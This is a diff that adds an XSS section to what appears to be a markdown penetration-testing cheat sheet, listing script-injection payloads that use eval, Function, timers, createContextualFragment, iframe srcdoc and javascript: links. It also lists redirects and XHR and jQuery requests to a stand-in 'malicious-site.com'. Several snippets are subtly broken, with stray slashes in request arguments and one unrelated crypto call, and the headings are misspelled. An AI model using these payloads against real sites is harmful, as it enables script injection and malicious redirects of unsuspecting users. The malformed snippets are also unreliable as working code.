@@ -7,6 +7,7 @@
 - [lfi](#lfi).
 - [open redirect](#openRedict)
 - [shell upload](#shellupload)
+- [xss](#xss)
 
 
 
@@ -872,6 +873,79 @@ Content-Type: application/x-php
 
 ------abcdefghijk
 ```
+# the end 
 
+### xss
+>-commom source view
+
+
+> payalod xss tosinks
+> xss common bypass alert()
+```
+<script>eval('alert("XSS")')</script>
+
+<script>Function('alert("XSS")')()</script>
+
+<script>setTimeout('alert("XSS")', 1000)</script>
+
+<script>setInterval('alert("XSS")', 1000)</script>
+
+<script>document.execCommand('alert', false, 'XSS')</script>
+
+<script>execScript('alert("XSS")')</script>
+
+<script>
+var range = document.createRange();
+var fragment = range.createContextualFragment('<script>alert("XSS")</script>');
+document.body.appendChild(fragment);
+</script>
+
+
+<script>
+var crypto = window.crypto || window.msCrypto;
+var request = crypto.generateCRMFRequest();
+console.log(request);
+</script>
+```
+> xss t open red
+```
+<script>location.replace('https://malicious-site.com')</script>
+
+<script>location.assign('https://malicious-site.com')</script>
+```
+>xss script to JavaScript
+```
+<a href="javascript:open('javascript:alert(1)')">Click me</a>
+```
+```
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+```
+>XMLHttpRequest.open()
+```
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://malicious-site.com",/ true);
+xhr.send();
+</script>
+```
+```
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://example.com",/ true);
+xhr.send('<script>alert("XSS")</script>');
+</script>
+```
+>jQuery
+```
+<script>
+$.ajax({
+    url: 'https://malicious-site.com',/
+    type: 'GET',
+    success: function(response) {
+        alert('XSS');
+    }
+});
+</script>
+```
 
 
